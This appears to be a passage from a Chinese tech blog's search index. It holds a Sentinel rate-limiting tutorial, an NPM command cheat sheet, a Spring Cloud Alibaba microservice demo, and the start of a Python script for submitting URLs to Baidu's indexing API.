1234567891011121314151617@Servicepublic class AsyncService { /** * @Async 表示异步调用方法 */ @Async public void hello() { System.out.println("start async method ..."); try { Thread.sleep(5000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println("end async method ..."); }} 12345678910111213141516171819202122232425262728@RestControllerpublic class TestAsyncController { private static final String RESOURCE_NAME = "Async"; @Autowired private AsyncService asyncService; @GetMapping("/async") public void hello() { AsyncEntry asyncEntry = null; try { // 使用流控规则 asyncEntry = SphU.asyncEntry(RESOURCE_NAME); // 被保护的资源 asyncService.hello(); } catch (BlockException e) { // 被限流 e.printStackTrace(); System.out.println("系统繁忙，请稍后 ..."); } finally { if (asyncEntry != null) { // 限流的出口 asyncEntry.exit(); } } }} 注解方式定义资源 通过 @SentinelResource 注解的 blockHandler 属性制定具体的限流处理方法 实现处理方法，该方法的传参必须与资源点的传参一样，并且最后必须加上 BlockException 异常参数，同时返回类型也必须一样 从 1.4.0 版本开始，使用注解的方式定义资源，默认支持自动统计业务异常，无需再手动调用 Tracer.trace(ex) 来记录业务异常 更多注解属性说明，可以看这里 1234567891011121314151617181920212223242526272829303132@RestControllerpublic class TestAnnotationController { /** * 资源名称 */ private static final String RESOURCE_NAME = "Annotation"; /** * @return * @SentinelResource 定义资源 * value：资源名称 * blockHandler：限流处理的方法 */ @SentinelResource(value = RESOURCE_NAME, blockHandler = "exceptionHandler") @GetMapping("/annotation") public String hello() { // 被保护的资源 return "Hello Sentinel!"; } /** * 原方法被限流的时候调用此方法 * * @param e * @return */ public String exceptionHandler(BlockException e) { e.printStackTrace(); return "系统繁忙，请稍候 ..."; }} 下篇 - Sentinel 入门教程（中级篇） Sentinel 入门教程 - 中级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"NPM 常用命令介绍",url:"/posts/f93d57c7.html",text:'模块管理NPM 安装与卸载模块1234567891011121314151617# 全局安装$ npm install xxxx -g# 局部安装，且更新package.json文件$ npm install xxxx --save# 卸载指定模块$ npm uninstall xxxx# 卸载全局模块$ npm uninstall xxxx -g# 查看模块的最新版本号$ npm view xxxx version# 查看模块的所有版本号$ npm view xxxx versions NPM 检查模块更新1234567891011# 全局安装检查更新的模块$ npm install npm-check-updates -g# 检查可更新的模块$ npm-check-updates# 更新所有模块，且更新package.json文件中的依赖包到最新版本（企业项目开发切忌一次性全部更新）$ npm-check-updates -u# 更新指定的模块，且更新package.json文件（与模块的安装操作没有本质区别，只是指定了新的版本号），如果执行失败可尝试删除package-lock.json文件后再更新$ npm install xxxx@0.1.9 --save NPM 查看已安装的模块查看局部已安装的模块，--depth 参数表示深度 1$ npm list --depth 0 查看全局已安装的模块，--depth 参数表示深度 1$ npm list -g --depth 0 代理设置NPM 设置代理12345678910# 设置代理与仓库源$ npm config set proxy=http://127.0.0.1:1080$ npm config set registry=http://registry.npmjs.org# 关于Https，若上面使用了https开头的仓库源，此时需要额外设置https_proxy参数，反则不需要设置$ npm config set https-proxy http://127.0.0.1:1080# 取消代理$ npm config delete proxy$ npm config delete https-proxy 权限配置解决 NPM 安装模块的权限问题NPM 出于安全考虑不支持以 root 用户运行，即使用 root 用户身份运行了，NPM 会自动转成一个叫 nobody 的用户来运行，而这个用户几乎没有任何权限。这样的话如果脚本里有一些需要权限的操作，比如写文件（尤其是写 /root/.node-gyp），程序就会崩掉。为了避免这种情况，要么按照 NPM 的规矩来，专门建一个用于运行 npm 命令的高权限用户；要么加 --unsafe-perm 参数，这样就不会切换到 nobody 用户上，运行时是哪个用户就是哪个用户，即使是 root 用户。 1$ npm install --unsafe-perm=true --allow-root NPM 镜像加速在使用 NPM 的过程中经常会遇到无法下载包的问题，这里整理了几种 NPM 使用国内镜像加速的方法。 淘宝镜像源12345# 配置淘宝镜像源$ npm config set registry https://registry.npm.taobao.org# 验证配置是否生效$ npm config get registry 华为云镜像源12345# 配置华为镜像源$ npm config set registry https://mirrors.huaweicloud.com/repository/npm/# 验证配置是否生效$ npm config get registry 使用 CNPM 替代 NPM12345# 全局安装CNPM# npm install -g cnpm --registry=https://registry.npm.taobao.org# 安装模块$ cnpm install xxx var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"前端"},{title:"Spring Cloud Alibaba 综合集成架构演示案例",url:"/posts/7f5a87b2.html",text:'前言Spring Cloud 是一套较为全面的微服务框架集，集成了如服务注册发现、配置中心、消息总线、负载均衡、断路器、API 网关等功能实现。而在网上经常会发现 Spring Cloud 与阿里巴巴的 Dubbo 进行选择对比，这样做其实不是很妥当，前者是一套较为完整的微服务架构方案，而 Dubbo 只是服务治理与 RPC 实现方案。Dubbo 在国内有着非常大的用户群体，但是其周边设施与组件相对来说并不那么完善。很多开发者用户又很希望享受 Spring Cloud 的生态，因此也会有一些 Spring Cloud 与 Dubbo 一起使用的案例与方法出现，但是一直以来大部分 Spring Cloud 整合 Dubbo 的使用方案都不完善，直到 Spring Cloud Alibaba 的出现，才得以解决这样的问题。 问题延伸由于 Feign 是基于 HTTP Restful 的调用，在高并发下的性能不够理想，那么 RPC 方案能否切换为 Dubbo？Spring Cloud 与阿里系的若干组件能否完美集成呢？ 整体系统架构系统架构图 API 网关：系统统一入口，屏蔽架构内部结构，统一安全拦截，采用 Zuul 实现 Application-1：应用 1，模拟应用，提供 HTTP 接口服务给 API 网关调用（Feign） Service-1：微服务 1，模拟微服务，提供 Dubbo 接口服务给 Application-1 调用 Service-2：微服务 2，模拟微服务，提供 Dubbo 接口服务给 Application-1 调用 架构分层 接入层：API 网关 应用层：Application-1 微服务层：Service-1、Service-2 调用流程 所有访问系统的请求都要经过 API 网关，网关转发 HTTP 请求至 Application-1，然后 Application-1 使用 Dubbo 调用 Service-1 完成自身业务，最后 Sevice-1 使用 Dubbo 调用 Service-2 完成自身业务。至此，完成所有组件贯穿。 Application 与 Sevice 的区别 形成 Service 支撑 Application 的整体架构，增加多变的 Application 甚至不需要变动 Service Service 提供了基础服务功能，而 Application 组装基础服务功能，提供给用户直接可用的业务，适合快速迭代开发 Service 服务粒度小、功能基础，不易发生改变，而 Application 提供上游业务功能，紧贴业务需求，容易发生改变 Spring Cloud Alibaba 集成架构演示案例1.0、技术选型Spring Boot、Spring Cloud Zuul、Spring Cloud OpenFeign、Nacos、Dubbo 1.1、版本说明 Zuul 1.3.1 Dubbo 2.7.8 Nacos Server 1.4.0 Spring Boot 2.1.18.RELEASE Spring Cloud Greenwich.SR6 Spring Cloud Alibaba Dubbo 2.2.3.RELEASE Spring Cloud Alibaba Nacos Config 2.1.3.RELEASE Spring Cloud Alibaba Nacos Discovery 2.1.3.RELEASE 本案例中使用的各开源组件的版本如上，其中 Spring Cloud Alibaba Nacos Config 并没有真正发挥配置中心的作用，因为本文为了方便演示，并没有将 bootstrap.yml 配置文件里的部分配置信息发布到 Nacos Server（配置中心 + 注册中心），尤其是 api-gateway 工程里的路由映射配置，点击下载完整的案例代码。 1.2、工程结构采用 Maven 工程结构（如下），为了方便演示，各组件的开发顺序为： service-2 -&gt; service-1 -&gt; application-1 -&gt; api-gateway 123456789alibaba-micro-service-study 整体父工程├── api-gateway API 网关，端口：56010├── application-1 应用 1，端口：56020├── service-1 服务 1 父工程│&nbsp;&nbsp; ├── service-1-api 服务 1 API│&nbsp;&nbsp; ├── service-1-business 服务 1 业务实现，端口：56030└── service-2 服务 2 父工程 ├── service-2-api 服务 2 API └── services-2-business 服务 2 业务实现，端口：56040 1.3、创建 Maven 父工程创建 Maven 父工程，配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体配置如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt;&lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;pom&lt;/packaging&gt;&lt;modules&gt; &lt;module&gt;api-gateway&lt;/module&gt; &lt;module&gt;application-1&lt;/module&gt; &lt;module&gt;service-1&lt;/module&gt; &lt;module&gt;service-2&lt;/module&gt; &lt;/modules&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt; &lt;/parent&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;spring-cloud-dubbo.version&gt;2.2.3.RELEASE&lt;/spring-cloud-dubbo.version&gt; &lt;spring-cloud-nacos.version&gt;2.1.3.RELEASE&lt;/spring-cloud-nacos.version&gt; &lt;/properties&gt; &lt;!-- 管理依赖 --&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-dubbo&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-dubbo.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-nacos.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-nacos.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;!-- 利用传递依赖，公共部分 --&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 1.4、创建 Service 2 工程Service 2 工程 的 Maven 配置如下： 1234567891011121314&lt;artifactId&gt;service-2&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;pom&lt;/packaging&gt;&lt;modules&gt; &lt;module&gt;service-2-api&lt;/module&gt; &lt;module&gt;services-2-business&lt;/module&gt;&lt;/modules&gt;&lt;parent&gt; &lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt; 1.4.1、创建 Service 2 API 工程Service 2 API 工程非常简单，只负责声明服务接口，没有具体的实现，Maven 配置如下： 123456789&lt;artifactId&gt;service-2-api&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt; 声明服务接口 123456public interface ProviderService { public String add(Integer a, Integer b); public String sub(Integer a, Integer b);} 1.4.2、创建 Service 2 Business 工程引入 service-2-api 依赖，由于需用使用 Dubbo 供 service-1 模块进行远程调用，因此需要引入 spring-cloud-starter-dubbo 依赖 1234567891011121314151617181920212223242526272829&lt;artifactId&gt;services-2-business&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-dubbo&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建主启动类，添加 @EnableDiscoveryClient 注解，启用服务发现，将服务注册到 Nacos Server 12345678@SpringBootApplication@EnableDiscoveryClientpublic class Service2Application { public static void main(String[] args) { SpringApplication.run(Service2Application.class, args); }} 创建具体的服务接口实现类，添加 @DubboService 注解标记此类的方法暴露为 Dubbo 接口 1234567891011121314151617181920/** * 使用 @DubboService 注解标记此类的方法暴露为Dubbo接口 */@DubboServicepublic class ProviderServiceImpl implements ProviderService { private Logger LOG = LoggerFactory.getLogger(ProviderServiceImpl.class); @Override public String add(Integer a, Integer b) { LOG.info("service 2 business invoke"); return String.valueOf(a + b); } @Override public String sub(Integer a, Integer b) { LOG.info("service 2 business invoke"); return String.valueOf(a - b); }} 添加 bootstrap.yml 配置文件，加入 Dubbo 相关的配置内容 1234567891011121314151617181920212223242526272829303132server: port: ${port:56040} servlet: context‐path: /service2spring: application: name: service2 cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 cluster-name: DEFAULT config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 group: NACOS_MICRO_SERVICE_GROUP # xxx业务组dubbo: scan: base-packages: com.alibaba.micro.study protocol: name: dubbo port: 20891 registry: address: nacos://127.0.0.1:8848 # 注册中心地址 application: qos-enable: false # Dubbo运维服务是否开启 consumer: check: false # 启动时就否检查依赖的服务 1.5、创建 Service 1 工程Service 1 工程 的 Maven 配置如下： 1234567891011121314&lt;artifactId&gt;service-1&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;pom&lt;/packaging&gt;&lt;modules&gt; &lt;module&gt;service-1-api&lt;/module&gt; &lt;module&gt;service-1-business&lt;/module&gt;&lt;/modules&gt;&lt;parent&gt; &lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt; 1.5.1、创建 Service 1 API 工程Service 1 API 工程非常简单，只负责声明服务接口，没有具体的实现，Maven 配置如下： 123456789&lt;artifactId&gt;service-1-api&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-1&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt; 声明服务接口 1234public interface ConsumerService { public String add(Integer a, Integer b);} 1.5.2、创建 Service 1 Business 工程引入 service-1-api、service-2-api 依赖，由于需用使用 Dubbo 调用 service-2-business 的服务实现，因此需要引入 spring-cloud-starter-dubbo 依赖 12345678910111213141516171819202122232425262728293031323334&lt;artifactId&gt;service-1-business&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-1&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-1-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-dubbo&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建主启动类，添加 @EnableDiscoveryClient 注解，启用服务发现，将服务注册到 Nacos Server 12345678@SpringBootApplication@EnableDiscoveryClientpublic class Service1Application { public static void main(String[] args) { SpringApplication.run(Service1Application.class, args); }} 创建具体的服务接口实现类，添加 @DubboService 注解标记此类的方法暴露为 Dubbo 接口，同时使用 @DubboReference 注解生成接口代理对象，然后通过代理对象进行远程调用 service-2 的服务 1234567891011121314151617181920/** * 使用 @DubboService 注解标记此类的方法暴露为Dubbo接口 */@DubboServicepublic class ConsumerServiceImpl implements ConsumerService { /** * 生成接口代理对象，通过代理对象进行远程调用 */ @DubboReference private ProviderService providerService; private Logger LOG = LoggerFactory.getLogger(ConsumerServiceImpl.class); @Override public String add(Integer a, Integer b) { LOG.info("service 1 business invoke"); return providerService.add(a, b); }} 添加 bootstrap.yml 配置文件，加入 Dubbo 相关的配置内容 1234567891011121314151617181920212223242526272829303132server: port: ${port:56030} servlet: context‐path: /service1spring: application: name: service1 cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 cluster-name: DEFAULT config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 group: NACOS_MICRO_SERVICE_GROUP # xxx业务组dubbo: scan: base-packages: com.alibaba.micro.study protocol: name: dubbo port: 20881 registry: address: nacos://127.0.0.1:8848 # 注册中心地址 application: qos-enable: false # Dubbo运维服务是否开启 consumer: check: false # 启动时就否检查依赖的服务 1.6、创建 Application 1 工程引入 service-1-api、service-2-api 依赖，由于需要使用 Dubbo 进行远程调用，因此还需要引入 spring-cloud-starter-dubbo 依赖 12345678910111213141516171819202122232425262728293031323334&lt;artifactId&gt;application-1&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-1-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-dubbo&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建主启动类，添加 @EnableDiscoveryClient 注解，启用服务发现，将服务注册到 Nacos Server 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ApplicationBootstrap { public static void main(String[] args) { SpringApplication.run(ApplicationBootstrap.class, args); }} 创建 Controller 测试类，暴露供第三方调用的 HTTP API，同时使用 @DubboReference 注解生成接口代理对象，然后通过代理对象进行远程调用 service-1、service-2 的服务 1234567891011121314151617181920212223242526272829@RestControllerpublic class ApplicationController { /** * 生成接口代理对象，通过代理对象进行远程调用 */ @DubboReference private ConsumerService consumerService; /** * 生成接口代理对象，通过代理对象进行远程调用 */ @DubboReference private ProviderService providerService; private Logger LOG = LoggerFactory.getLogger(ApplicationController.class); @GetMapping("/add") public String add(Integer a, Integer b) { LOG.info("application invoke"); return consumerService.add(a, b); } @GetMapping("/sub") public String sub(Integer a, Integer b) { LOG.info("application invoke"); return providerService.sub(a, b); }} 添加 bootstrap.yml 配置文件，特别注意，这里并没有将 appplication-1 的任何 Dubbo 服务注册到 Nacos Server，只是单纯的作为 Dubbo 服务的消费者 1234567891011121314151617181920212223server: port: ${port:56020} servlet: context‐path: /application1spring: application: name: application1 cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 cluster-name: DEFAULT config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 group: NACOS_MICRO_SERVICE_GROUP # xxx业务组dubbo: consumer: check: false # 启动时就否检查依赖的服务 1.7、创建 API 网关工程引入 Maven 依赖，由于使用了 Zuul 作为网关服务，因此需要引入 spring-cloud-starter-netflix-zuul 依赖，同时这里指定 Zuul 通过 Feign 将第三方的 HTTP 请求转发给 application-1 服务，还需要引入 spring-cloud-starter-openfeign 12345678910111213141516171819202122232425262728&lt;artifactId&gt;api-gateway&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建主启动类，添加 @EnableDiscoveryClient、@EnableZuulProxy 123456789@SpringBootApplication@EnableDiscoveryClient@EnableZuulProxypublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} 添加 bootstrap.yml 配置文件，由于路由的映射规则会经常发生改变，在生产环境中建议将下列 Zuul 相关的配置发布到 Nacos Server（配置中心 + 注册中心）中。为了演示方便，这里直接将 Zuul 的路由配置信息写在 bootstrap.yml 里。 12345678910111213141516171819202122232425server: port: ${port:56010} servlet: context‐path: /api-gatewayspring: application: name: api-gateway cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 cluster-name: DEFAULT config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 group: NACOS_MICRO_SERVICE_GROUP # xxx业务组zuul: routes: application1: stripPrefix: false path: /application1/** 或者将 Zuul 的路由规则配置发布到 Nacos Server，而不是直接写在 bootstrap.yml 配置文件中，如下图所示： 1.8、测试应用代码 1）分别启动 service-2、service-1、application-1、api-gateway 应用 2）浏览器访问 http://127.0.0.1:56020/application1/sub?a=6&amp;b=2，若响应结果正确返回，则说明 service-2、application-1 服务运行正常 3）浏览器访问 http://127.0.0.1:56020/application1/add?a=3&amp;b=4，若响应结果正确返回，则说明 service-2、service-1、application-1 服务运行正常 4）浏览器访问 http://127.0.0.1:56010/api-gateway/application1/add?a=3&amp;b=4，若响应结果正确返回，则说明 service-2、service-1、application-1、api-gateway 服务运行正常 Nacos Server 的服务列表如下： 若希望测试各服务多实例的负载均衡调用情况，可以通过 -Dport=xxxxx VM 参数指定不同的端口来启动多个服务实例即可，这里不再累述 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"百度搜索资源平台 - 站点天级收录（Python 版）",url:"/posts/3971860d.html",text:'前言注册开通百度熊掌 ID 后（该产品后来改名为移动专区），百度搜索资源平台提供了站点天级收录的 API，可以让站长享受天级收录站点的机会（存在天级收录配额限制），这样可以很大程度地加快站点的收录。本文会给出现成的 Python 版本站点天级收录代码，系统环境依赖 Linux，软件环境依赖 Python3、Curl。 Python3 代码以下代码会读取特定域名下的 sitemap 站点地图文件，然后通过 Curl 命令将站点地图文件中合法 （结尾为 .html）的 URL 批量提交给百度搜索资源平台，请自行替换代码中的 domain、app_id、token、site_map_url、day_submit_max_lines 变量值。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125# -*- coding: utf-8 -*-import reimport osimport loggingimport subprocessfrom io import StringIOfrom urllib import request# 站点域名domain = \'www.example.com\'# 搜索资源平台申请的唯一识别IDapp_id = \'xxxxxxxxxxxxxxxxx\'# 搜索资源平台申请的提交用的准入密钥token = \'xxxxxxxxxxxxxxxxxxxxxx\'# 站点地图的URLsite_map_url = \'https://www.example.com/sitemap.xml\'# 最大的提交数量（天级收录配额）day_submit_max_lines = 10# 提交链接的接口day_submit_url = \'http://data.zz.baidu.com/urls?appid={app_id}&amp;token={token}&amp;type=realtime\'.format(app_id=app_id, token=token)# 提交的URL链接文件day_submit_urls_file = "/tmp/baidu_xiongzhang_day_submit_url.txt"# 记录历史提交位置的索引文件（索引从一开始）day_record_file = "/tmp/baidu_xiongzhang_day_record.txt"# 日志文件log_file = "/tmp/baidu_xiongzhang_day.log"def regexpMatchUrl(content): pattern = re.findall(r\'(http|https):\\/\\/[\\w\\-_]+(\\.[\\w\\-_]+)+([\\w\\-\\.,@?^=%&amp;amp;:/~\\+#]*[\\w\\-\\@?^=%&amp;amp;/~\\+#])?\', content, re.IGNORECASE) if pattern: return True else: return Falsedef regexpMatchWebSite(content): pattern = re.findall(r\'\'.join(domain), content, re.IGNORECASE) if pattern: return True else: return Falsedef getUrl(content): pattern = re.findall(r\'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+.html\', content, re.IGNORECASE) if pattern: return pattern[0] else: 